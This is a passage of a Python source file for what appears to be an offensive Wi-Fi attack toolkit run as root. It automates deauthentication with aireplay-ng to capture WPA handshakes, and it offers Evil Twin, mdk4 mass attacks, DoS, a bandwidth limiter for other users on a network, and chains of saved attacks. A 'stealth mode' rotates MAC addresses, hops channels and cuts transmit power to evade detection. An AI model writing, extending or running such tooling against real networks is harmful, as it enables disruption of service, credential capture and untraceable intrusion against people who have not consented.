        capture_filename = f"{essid_sanitized}-{bssid_sanitized}-{timestamp}"
        capture_filepath = os.path.join(handshake_dir, capture_filename)

        print(f"{YELLOW}[*] Setting interface to channel {target_ap['channel']}...{NC}")
        self._run_command(['iw', 'dev', self.interface, 'set', 'channel', target_ap['channel']], quiet=True)

        airodump_proc = None
        try:
            print(f"{YELLOW}[*] Starting capture... Output will be saved to {capture_filepath}-01.cap{NC}")
            airodump_cmd = [
                'airodump-ng',
                '--bssid', target_ap['bssid'],
                '--channel', target_ap['channel'],
                '--write', capture_filepath,
                '--output-format', 'cap',
                self.interface
            ]
            airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, bufsize=1)
            self.active_processes.append(airodump_proc)
            time.sleep(3)

            target_client = next((c['mac'] for c in clients if c['ap'] == target_ap['bssid']), None)

            if target_client:
                print(f"{YELLOW}[*] Found client {target_client}. Sending deauth packets to provoke handshake...{NC}")
            else:
                print(f"{YELLOW}[!] No clients found. Sending broadcast deauth. A client must connect for a capture.{NC}")
            
            deauth_cmd = ['aireplay-ng', '--deauth', '5', '-a', target_ap['bssid']]
            if target_client:
                deauth_cmd.extend(['-c', target_client])
            deauth_cmd.append(self.interface)
            
            self._run_command(deauth_cmd, quiet=True)
            print(f"{GREEN}[✔] Deauth packets sent.{NC}")

            print(f"{YELLOW}[*] Monitoring for handshake for up to 60 seconds...{NC}")
            handshake_found = False
            start_time = time.time()
            
            for line in iter(airodump_proc.stdout.readline, ' '):
                if time.time() - start_time > 60:
                    break
                if "WPA handshake" in line:
                    print(f"\n{GREEN}[✔] WPA Handshake captured!{NC}")
                    handshake_found = True
                    break
                print(f"\r{YELLOW}[*] Waiting... {int(time.time() - start_time)}s elapsed{NC}", end="")
                time.sleep(0.1)

            if handshake_found:
                print(f"\n{GREEN}[✔] Capture successful! File saved at:{NC}")
                print(f"  {YELLOW}{capture_filepath}-01.cap{NC}")
            else:
                print(f"\n{RED}[!] Handshake not captured within timeout.{NC}")
                print(f"{YELLOW}[*] Capture file ({capture_filepath}-01.cap) may still contain useful data.{NC}")

        except Exception as e:
            print(f"\n{RED}An error occurred during capture: {e}{NC}")
        finally:
            print(f"\n{YELLOW}[*] Cleaning up processes...{NC}")
            if airodump_proc and airodump_proc.poll() is None:
                airodump_proc.terminate()
                if airodump_proc in self.active_processes:
                    self.active_processes.remove(airodump_proc)

            print(f"{GREEN}Press any key to return to the main menu...{NC}")
            getch()

    def run_evil_twin_attack(self):
        """Launches the Evil Twin attack."""
        self._print_header()
        print(f"{YELLOW}[*] Initializing Evil Twin Attack...{NC}")
        if not self._ensure_monitor_mode():
            return

        self.evil_twin_instance = EvilTwin(self.interface, self._log)
        self.evil_twin_instance.start_attack()
        print(f"{GREEN}Press any key to return to the main menu...{NC}")
        getch()
            
    def select_managed_interface(self):
        """Detects and allows user to select a connected, managed wireless interface."""
        print(f"{YELLOW}[*] Detecting connected wireless interfaces...{NC}")
        interfaces = []
        
        try:
            all_ifaces = os.listdir('/sys/class/net')
            
            for iface in all_ifaces:
                if os.path.exists(f'/sys/class/net/{iface}/phy80211'):
                    iwconfig_res = self._run_command(['iwconfig', iface], quiet=True)
                    if iwconfig_res and 'Mode:Managed' in iwconfig_res.stdout:
                        ip_res = self._run_command(['ip', 'addr', 'show', iface], quiet=True)
                        if ip_res and 'inet ' in ip_res.stdout:
                            interfaces.append(iface)
        except Exception as e:
            print(f"{RED}Error detecting interfaces: {e}{NC}")
            self._log("ERROR", f"Failed to detect managed interfaces: {e}")
            return None

        if not interfaces:
            print(f"{RED}No connected, managed wireless interfaces found.{NC}")
            print(f"{YELLOW}The bandwidth limiter requires an interface connected to a WiFi network.{NC}")
            time.sleep(4)
            return None

        while True:
            print("\nPlease select the interface connected to the target network:")
            for i, iface in enumerate(interfaces):
                print(f"  {i + 1}) {iface}")
            print(f"  {len(interfaces) + 1}) Cancel")

            choice = input(f"\n{YELLOW}Select an interface [1-{len(interfaces) + 1}]: {NC}").strip()
            if choice == str(len(interfaces) + 1):
                return None
            try:
                selected_index = int(choice) - 1
                if 0 <= selected_index < len(interfaces):
                    selected_iface = interfaces[selected_index]
                    print(f"{GREEN}[✔] Interface selected: {selected_iface}{NC}")
                    return selected_iface
                else:
                    print(f"{RED}Invalid selection. Please try again.{NC}")
            except ValueError:
                print(f"{RED}Invalid input. Please enter a number.{NC}")
            time.sleep(1)

    def run_bandwidth_limiter(self):
        """Initializes and runs the Evil Limiter tool."""
        self._print_header()
        print(f"{YELLOW}[*] Initializing Bandwidth Limiter (Evil Limiter)...{NC}")
        
        required_deps = ["tc", "iptables", "sysctl"]
        missing_deps = [dep for dep in required_deps if not shutil.which(dep)]
        if missing_deps:
            print(f"{RED}Error: Missing dependencies for Evil Limiter: {', '.join(missing_deps)}{NC}")
            print(f"{YELLOW}Please install them (e.g., sudo apt install iproute2 iptables kmod){NC}")
            time.sleep(4)
            return

        selected_interface = self.select_managed_interface()
        if not selected_interface:
            print(f"{RED}[!] No interface selected. Returning to main menu.{NC}")
            time.sleep(2)
            return

        limiter_runner = EvilLimiterRunner(selected_interface, self._log)
        limiter_runner.run()
        
        print(f"{GREEN}Press any key to return to the main menu...{NC}")
        getch()

    def show_main_menu(self):
        """Displays a cleaner main menu and handles user choices."""
        while True:
            self._print_header()
            
            # --- System Status ---
            print(f"{BLUE}---[ SYSTEM STATUS ]---{NC}")
            
            if self.interface:
                res = self._run_command(['iwconfig', self.interface], quiet=True)
                mode = "Monitor" if res and "Mode:Monitor" in res.stdout.replace(" ", "") else "Managed"
                current_mac = self.new_mac or self.original_mac
                if not current_mac:
                    mac_res = self._run_command(['ip', 'link', 'show', self.interface], quiet=True)
                    match = re.search(r'ether (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', mac_res.stdout if mac_res else "")
                    if match: current_mac = match.group(1)
                
                print(f"  Interface  : {GREEN}{self.interface}{NC} ({mode} Mode)")
                print(f"  MAC Address: {YELLOW}{current_mac or 'Unknown'}{NC}")
            else:
                print(f"  Interface  : {RED}Not Selected{NC}")
                print(f"  MAC Address: {RED}N/A{NC}")

            stealth_status = f"{GREEN}ACTIVE{NC}" if self.stealth_mode else f"{RED}INACTIVE{NC}"
            print(f"  Stealth    : {stealth_status}")
            print(f"  TX Power   : {YELLOW}{self.current_tx_power} dBm{NC}")
            print(f"{BLUE}-----------------------{NC}")

            # --- Main Menu ---
            print(f"\n{BLUE}---[ MAIN MENU ]---{NC}")
            print(f"  [{GREEN}0{NC}] Network Bandwidth Limiter (Evil Limiter)")
            print(f"  [{GREEN}1{NC}] Scan for Networks (airodump-ng)")
            print(f"  [{GREEN}2{NC}] Launch Mass Attack (mdk4)")
            print(f"  [{GREEN}3{NC}] Launch Targeted Attack (aireplay-ng)")
            print(f"  [{GREEN}4{NC}] Automated Handshake Capture")
            print(f"  [{GREEN}5{NC}] Launch Evil Twin Attack")
            print(f"  [{GREEN}6{NC}] Launch DoS Attack")
            print(f"  [{GREEN}7{NC}] Run Automated Chain")
            print(f"  [{GREEN}8{NC}] Toggle Stealth Mode")
            print(f"  [{GREEN}9{NC}] Exit and Restore")
            print(f"{BLUE}-------------------{NC}")
            
            print(f"\n{YELLOW}Select an option [0-9]:{NC} ", end='', flush=True)
            choice = getch()
            if isinstance(choice, bytes):
                choice = choice.decode('utf-8')

            if choice == '0': self.run_bandwidth_limiter()
            elif choice == '1': self.run_airodump_scan()
            elif choice == '2': self.run_mdk4_attack()
            elif choice == '3': self.run_interactive_attack()
            elif choice == '4': self.run_handshake_capture()
            elif choice == '5': self.run_evil_twin_attack()
            elif choice == '6': self.run_dos_attack()
            elif choice == '7': self.run_automated_chain()
            elif choice == '8': self.toggle_stealth_mode()
            elif choice == '9':
                break
            else:
                print(f"\n{RED}Invalid option. Please try again.{NC}\n")
                time.sleep(1)

    def _save_attack_chain(self, chain_name, attack_chain):
        """Saves an attack chain to a file."""
        chains_dir = os.path.expanduser("~/.wifi-toolkit/chains")
        os.makedirs(chains_dir, exist_ok=True)
        chain_file = os.path.join(chains_dir, f"{chain_name}.chain")
        
        chain_data = [func.__name__ for func in attack_chain]
        with open(chain_file, 'w') as f:
            f.write('\n'.join(chain_data))
        return chain_file

    def _load_attack_chain(self, chain_name):
        """Loads an attack chain from a file."""
        chains_dir = os.path.expanduser("~/.wifi-toolkit/chains")
        chain_file = os.path.join(chains_dir, f"{chain_name}.chain")
        
        if not os.path.exists(chain_file):
            return None
            
        attack_funcs = {
            'run_airodump_scan': self.run_airodump_scan,
            'run_mdk4_attack': self.run_mdk4_attack,
            'run_interactive_attack': self.run_interactive_attack
        }
        
        with open(chain_file, 'r') as f:
            chain_data = f.read().splitlines()
        return [attack_funcs[name] for name in chain_data if name in attack_funcs]

    def _list_saved_chains(self):
        """Lists all saved attack chains."""
        chains_dir = os.path.expanduser("~/.wifi-toolkit/chains")
        if not os.path.exists(chains_dir):
            return []
        return [f.replace('.chain', '') for f in os.listdir(chains_dir) if f.endswith('.chain')]

    def run_automated_chain(self):
        """Allows the user to build and run a sequence of attacks."""
        self._print_header()
        print(f"{BLUE}--- BUILD AUTOMATED ATTACK CHAIN ---{NC}")
        print(f"{YELLOW}Available Attacks:{NC}")
        print("  1) Scan for Networks (airodump-ng)")
        print("  2) Launch Mass Attack (mdk4)")
        print("  3) Launch Interactive Targeted Attack (aireplay-ng)")
        print("  l) Load Saved Chain")
        print("  s) Save Current Chain")
        print("  d) Done - Execute Chain")
        print("  b) Back to Main Menu")
        print(f"\n{GREEN}Current Chain:{NC} ", end='')

        attack_chain = []
        while True:
            if attack_chain:
                print(f"\rCurrent Chain: {' → '.join([f'{GREEN}#{i+1}{NC}' for i in range(len(attack_chain))])}")
            print(f"\n{YELLOW}Press key to add attack [1-3/d/b]:{NC} ", end='', flush=True)
            choice = getch()
            if isinstance(choice, bytes):
                choice = choice.decode('utf-8')
            choice = choice.lower()
            print(choice)
            attack_names = {
                '1': 'Network Scan',
                '2': 'Mass Attack',
                '3': 'Targeted Attack'
            }
            
            if choice == 'l':
                saved_chains = self._list_saved_chains()
                if not saved_chains:
                    print(f"\n{YELLOW}[!] No saved chains found.{NC}")
                    time.sleep(1)
                    continue
                    
                print(f"\n{GREEN}Saved Chains:{NC}")
                for i, chain in enumerate(saved_chains):
                    print(f"  {i+1}) {chain}")
                print("\nPress key to select chain [1-{}]:".format(len(saved_chains)), end='', flush=True)
                
                choice = getch()
                if isinstance(choice, bytes):
                    choice = choice.decode('utf-8')
                try:
                    idx = int(choice) - 1
                    if 0 <= idx < len(saved_chains):
                        loaded_chain = self._load_attack_chain(saved_chains[idx])
                        if loaded_chain:
                            attack_chain = loaded_chain
                            print(f"\n{GREEN}[✔] Chain '{saved_chains[idx]}' loaded successfully!{NC}")
                        else:
                            print(f"\n{RED}[!] Failed to load chain.{NC}")
                    else:
                        print(f"\n{RED}[!] Invalid selection.{NC}")
                except ValueError:
                    print(f"\n{RED}[!] Invalid input.{NC}")
                time.sleep(1)
                continue
                
            elif choice == 's':
                if not attack_chain:
                    print(f"\n{YELLOW}[!] Chain is empty. Add some attacks first.{NC}")
                    time.sleep(1)
                    continue
                    
                print("\nEnter chain name (no spaces): ", end='')
                chain_name = input().strip()
                if chain_name and ' ' not in chain_name:
                    saved_file = self._save_attack_chain(chain_name, attack_chain)
                    print(f"\n{GREEN}[✔] Chain saved to {saved_file}{NC}")
                else:
                    print(f"\n{RED}[!] Invalid chain name.{NC}")
                time.sleep(1)
                continue
                
            elif choice == 'd':
                if not attack_chain:
                    print(f"\n{YELLOW}[!] Chain is empty. Add some attacks first.{NC}")
                    time.sleep(1)
                    continue
                break
                
            elif choice == 'b':
                if attack_chain:
                    print(f"\n{YELLOW}[?] Chain not empty. Are you sure you want to exit? (y/n):{NC} ", end='', flush=True)
                    confirm = getch()
                    if isinstance(confirm, bytes):
                        confirm = confirm.decode('utf-8')
                    print(confirm)
                    if confirm.lower() != 'y':
                        continue
                return
            elif choice in ['1', '2', '3']:
                attack_funcs = {
                    '1': self.run_airodump_scan,
                    '2': self.run_mdk4_attack,
                    '3': self.run_interactive_attack
                }
                attack_chain.append(attack_funcs[choice])
                print(f"\n{GREEN}[+] Added: {attack_names[choice]}{NC}")
                time.sleep(0.5)
            else:
                print(f"\n{RED}Invalid selection.{NC}")
                time.sleep(0.5)

        if not attack_chain:
            print(f"{YELLOW}No attacks added to the chain. Returning to main menu.{NC}")
            time.sleep(2)
            return

        print(f"\n{BLUE}--- RUNNING AUTOMATED ATTACK CHAIN ---{NC}")
        for i, attack_func in enumerate(attack_chain):
            print(f"\n{YELLOW}[*] Running step {i+1}/{len(attack_chain)}: {attack_func.__name__.replace('run_', '').replace('_', ' ').title()}{NC}")
            attack_func()
            print(f"{GREEN}[✔] Step {i+1} completed.{NC}")
            time.sleep(1)

        print(f"\n{GREEN}Automated attack chain completed.{NC}")
        time.sleep(3)

    def generate_summary_report(self):
        """Generates a summary report of the session."""
        os.makedirs(self.report_dir, exist_ok=True)
        report_filename = f"wifi_toolkit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        report_path = os.path.join(self.report_dir, report_filename)
        session_duration = datetime.now() - self.session_start_time

        with open(report_path, "w") as f:
            f.write("--- WIFI TOOLKIT SESSION SUMMARY ---")
            f.write(f"\nDate & Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            f.write(f"\nSession Duration: {str(session_duration).split('.')[0]}")
            f.write("\n------------------------------------")
            f.write(f"\nInterface Used: {self.interface or 'N/A'}")
            f.write(f"\nOriginal MAC: {self.original_mac or 'N/A'}")
            if self.new_mac:
                f.write(f"\nNew MAC (Spoofed): {self.new_mac}")
            
            if self.stealth_mode_ever_enabled:
                f.write("\n------------------------------------")
                f.write("\nStealth Mode Settings:")
                f.write(f"\n  MAC Rotation Interval: {self.mac_rotation_interval} seconds")
                f.write(f"\n  Channel Hopping Interval: {self.channel_hop_interval} seconds")
                f.write(f"\n  TX Power: {self.current_tx_power} dBm")

            f.write("\n------------------------------------")
            f.write(f"\nLog Details (from {self.logfile}):")
            if os.path.exists(self.logfile):
                with open(self.logfile, 'r') as log_f:
                    f.write(log_f.read())
            f.write("\n\n------------------------------------")
            f.write(f"\nComplete report saved to: {report_path}\n")
        
        print(f"{GREEN}[✔] Session summary report created at: {YELLOW}{report_path}{NC}")

    def _rotate_mac_address(self):
        """Rotates MAC address automatically in stealth mode."""
        if not self.stealth_mode:
            return
            
        current_time = time.time()
        if current_time - self.last_mac_rotation >= self.mac_rotation_interval:
            print(f"\r{YELLOW}[*] Rotating MAC address...{NC}", end='', flush=True)
            self._run_command(['ip', 'link', 'set', self.interface, 'down'], quiet=True)
            self._run_command(['macchanger', '-r', self.interface], quiet=True)
            self._run_command(['ip', 'link', 'set', self.interface, 'up'], quiet=True)
            
            # Get new MAC
            res = self._run_command(['ip', 'link', 'show', self.interface], quiet=True)
            if res:
                match = re.search(r'ether (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', res.stdout)
                if match:
                    self.new_mac = match.group(1)
                    print(f"\r{GREEN}[✔] MAC rotated to: {self.new_mac}{NC}", end='', flush=True)
            
            self.last_mac_rotation = current_time
            time.sleep(0.5)
            print("\r" + " " * 80 + "\r", end='')

    def _hop_channels(self):
        """Automatically hops between channels in stealth mode."""
        if not self.stealth_mode:
            return
            
        current_time = time.time()
        if current_time - self.last_channel_hop >= self.channel_hop_interval:
            new_channel = random.randint(1, 14)
            print(f"\r{YELLOW}[*] Hopping to channel {new_channel}...{NC}", end='', flush=True)
            
            self._run_command(['iw', 'dev', self.interface, 'set', 'channel', str(new_channel)], quiet=True)
            self.last_channel_hop = current_time
            time.sleep(0.5)
            print("\r" + " " * 80 + "\r", end='')

    def _adjust_tx_power(self, power_level):
        """Adjusts the transmission power of the wireless interface."""
        if not self.interface:
            return False
            
        if power_level < 0 or power_level > 30:
            print(f"{RED}[!] Invalid power level. Must be between 0-30 dBm{NC}")
            return False
            
        print(f"{YELLOW}[*] Setting TX power to {power_level} dBm...{NC}")
        self._run_command(['iw', 'dev', self.interface, 'set', 'txpower', 'fixed', str(power_level * 100)], quiet=True)
        self.current_tx_power = power_level
        return True

    def _stealth_mode_monitor(self):
        """Background monitor for stealth mode operations."""
        while self.stealth_mode:
            self._rotate_mac_address()
            self._hop_channels()
            time.sleep(1)

    def toggle_stealth_mode(self):
        """Toggles stealth mode on/off with a consistent getch() UI."""
        if not self._ensure_monitor_mode():
            return

        if self.stealth_mode:
            self.stealth_mode = False
            if self.stealth_thread and self.stealth_thread.is_alive():
                print(f"\n{YELLOW}[*] Disabling stealth mode...{NC}")
                time.sleep(1.5)
            print(f"{GREEN}[✔] Stealth mode disabled.{NC}")
            time.sleep(1)
            return

        self._print_header()
        print(f"{BLUE}=== STEALTH MODE CONFIGURATION ==={NC}")
        print(f"{YELLOW}[*] Configure stealth parameters:{NC}\n")
        
        print("MAC Address Rotation Interval:")
        print("  [1] Every 30 seconds (Default)")
        print("  [2] Every 1 minute")
        print("  [3] Every 5 minutes")
        print("  [4] Custom interval")
        
        print("\nPress key to select [1-4]:", end='', flush=True)
        choice = getch()
        if isinstance(choice, bytes): choice = choice.decode('utf-8')
        print(choice)
        
        if choice == '2':
            self.mac_rotation_interval = 60
        elif choice == '3':
            self.mac_rotation_interval = 300
        elif choice == '4':
            while True:
                try:
                    interval_str = input("\nEnter interval in seconds (min 10): ")
                    if not interval_str: continue
                    interval = int(interval_str)
                    if interval < 10:
                        print(f"{RED}[!] Interval too short. Using 10 seconds.{NC}")
                        interval = 10
                    self.mac_rotation_interval = interval
                    break
                except ValueError:
                    print(f"{RED}[!] Invalid input. Please enter a number.{NC}")
        else:
            self.mac_rotation_interval = 30

        print("\nChannel Hopping Interval:")
        print("  [1] Every 5 seconds (Default)")
        print("  [2] Every 10 seconds")
        print("  [3] Every 30 seconds")
        print("  [4] Custom interval")
        
        print("\nPress key to select [1-4]:", end='', flush=True)
        choice = getch()
        if isinstance(choice, bytes): choice = choice.decode('utf-8')
        print(choice)
        
        if choice == '2':
            self.channel_hop_interval = 10
        elif choice == '3':
            self.channel_hop_interval = 30
        elif choice == '4':
            while True:
                try:
                    interval_str = input("\nEnter interval in seconds (min 2): ")
                    if not interval_str: continue
                    interval = int(interval_str)
                    if interval < 2:
                        print(f"{RED}[!] Interval too short. Using 2 seconds.{NC}")
                        interval = 2
                    self.channel_hop_interval = interval
                    break
                except ValueError:
                    print(f"{RED}[!] Invalid input. Please enter a number.{NC}")
        else:
            self.channel_hop_interval = 5

        print("\nTransmission Power Level:")
        print("  [1] Low (5 dBm) - Stealthiest")
        print("  [2] Medium (10 dBm)")
        print("  [3] Normal (20 dBm)")
        print("  [4] Custom power")
        
        print("\nPress key to select [1-4]:", end='', flush=True)
        choice = getch()
        if isinstance(choice, bytes): choice = choice.decode('utf-8')
        print(choice)
        
        if choice == '1':
            self._adjust_tx_power(5)
        elif choice == '2':
            self._adjust_tx_power(10)
        elif choice == '4':
            while True:
                try:
                    power_str = input("\nEnter power level (0-30 dBm): ")
                    if not power_str: continue
                    power = int(power_str)
                    if not (0 <= power <= 30):
                        print(f"{RED}[!] Power level must be between 0 and 30.{NC}")
                        continue
                    self._adjust_tx_power(power)
                    break
                except ValueError:
                    print(f"{RED}[!] Invalid input. Please enter a number.{NC}")
        else:
            self._adjust_tx_power(20)
        
        print(f"\n{GREEN}[✔] Stealth mode will be enabled with:{NC}")
        print(f"  • MAC rotation every {self.mac_rotation_interval} seconds")
        print(f"  • Channel hopping every {self.channel_hop_interval} seconds")
        print(f"  • TX power set to {self.current_tx_power} dBm")
        
        self.stealth_mode = True
        self.stealth_mode_ever_enabled = True
        self.stealth_thread = threading.Thread(target=self._stealth_mode_monitor, daemon=True)
        self.stealth_thread.start()
        print(f"\n{GREEN}Stealth mode is now ACTIVE.{NC}")
        time.sleep(2)

    def cleanup(self):
        """Restores network settings and cleans up temporary files."""
        print(f"\n{YELLOW}[*] Cleaning up and restoring settings...{NC}")

        # --- NEW: Terminate all active subprocesses ---
        if self.active_processes:
            print(f"{YELLOW}[*] Stopping active attack processes...{NC}")
            for proc in self.active_processes:
                if proc.poll() is None:
                    try:
                        proc.terminate()
                        proc.wait(timeout=2)
                        print(f"[{GREEN}✔{NC}] Process {proc.pid} terminated.")
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        print(f"[{RED}✔{NC}] Process {proc.pid} killed.")
                    except Exception as e:
                        print(f"[{RED}!{NC}] Error stopping process {proc.pid}: {e}")
            self.active_processes = []
        # --- END NEW ---

        # --- NEW: Clean up Evil Twin processes if active ---
        if self.evil_twin_instance:
            self.evil_twin_instance.cleanup()
        # --- END NEW ---
        
        if self.stealth_mode:
            self.stealth_mode = False
            if self.stealth_thread and self.stealth_thread.is_alive():
                print(f"\n{YELLOW}[*] Disabling stealth mode...{NC}")
                time.sleep(1.5)

            if self.original_mac:
                print(f"{YELLOW}[*] Restoring original MAC address...{NC}")
                self._run_command(['ip', 'link', 'set', self.interface, 'down'], quiet=True)
                self._run_command(['macchanger', '-m', self.original_mac, self.interface], quiet=True)
                self._run_command(['ip', 'link', 'set', self.interface, 'up'], quiet=True)
            
            if self.current_tx_power != 20:
                self._adjust_tx_power(20)
            print(f"{YELLOW}[*] Disabling stealth mode...{NC}")

        self.generate_summary_report()

        scan_files = [f for f in os.listdir('/tmp') if f.startswith(f"wifi_scan_{os.getpid()}")]
        for f in scan_files:
            try:
                os.remove(os.path.join('/tmp', f))
            except OSError:
                pass

        if self.interface:
            print(f"[ ] Bringing interface {self.interface} down...")
            self._run_command(['ip', 'link', 'set', self.interface, 'down'], quiet=True)
            print(f"[ ] Setting interface {self.interface} to managed mode...")
            self._run_command(['iw', 'dev', self.interface, 'set', 'type', 'managed'], quiet=True)
            if self.original_mac:
                print("[ ] Restoring original MAC address...")
                self._run_command(['macchanger', '-p', self.interface], quiet=True)
                print(f"[{GREEN}✔{NC}] MAC address restored to original.")
            print(f"[ ] Bringing interface {self.interface} up...")
            self._run_command(['ip', 'link', 'set', self.interface, 'up'], quiet=True)
            print(f"[{GREEN}✔{NC}] Interface {YELLOW}{self.interface}{NC} restored to managed mode.")
        
        print("[ ] Restarting NetworkManager...")
        self._run_command(['systemctl', 'restart', 'NetworkManager'], quiet=True)
        print(f"[{GREEN}✔{NC}] NetworkManager restarted.")
        print(f"{GREEN}Cleanup complete. Your network should be back to normal.{NC}")
        
        if os.path.exists(self.logfile):
            try:
                os.remove(self.logfile)
            except OSError:
                pass

    def _ensure_monitor_mode(self):
        """
        Checks if an interface is in monitor mode, and if not,
        guides the user through the selection and setup process.
        Returns True if successful, False otherwise.
        """
        if self.interface:
            res = self._run_command(['iwconfig', self.interface], quiet=True)
            if res and "Mode:Monitor" in res.stdout.replace(" ", ""):
                return True

        self._print_header()
        print(f"{YELLOW}[*] An operation requires an interface in monitor mode.{NC}")
        
        self.select_interface()
        if not self.interface:
            print(f"{RED}[!] No interface selected. Aborting operation.{NC}")
            time.sleep(2)
            return False
        
        self.spoof_mac()
        self.set_monitor_mode()

        res = self._run_command(['iwconfig', self.interface], quiet=True)
        if res and "Mode:Monitor" in res.stdout.replace(" ", ""):
            return True
        else:
            print(f"{RED}[!] Failed to put interface in monitor mode. Aborting operation.{NC}")
            time.sleep(2)
            return False

    def run(self):
        """Main execution flow of the script."""
        try:
            self._print_header()
            self.check_dependencies()
            self.show_main_menu()
        except KeyboardInterrupt:
            print(f"\n{RED}Interrupted by user. Exiting...{NC}")
        except Exception as e:
            print(f"{RED}An unhandled exception occurred: {e}{NC}")
            self._log("FATAL", f"Unhandled exception: {e}")
        finally:
            self.cleanup()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{RED}Please run this script with sudo or as root.{NC}")
        sys.exit(1)
    
    toolkit = WifiToolkit()
    toolkit.run()

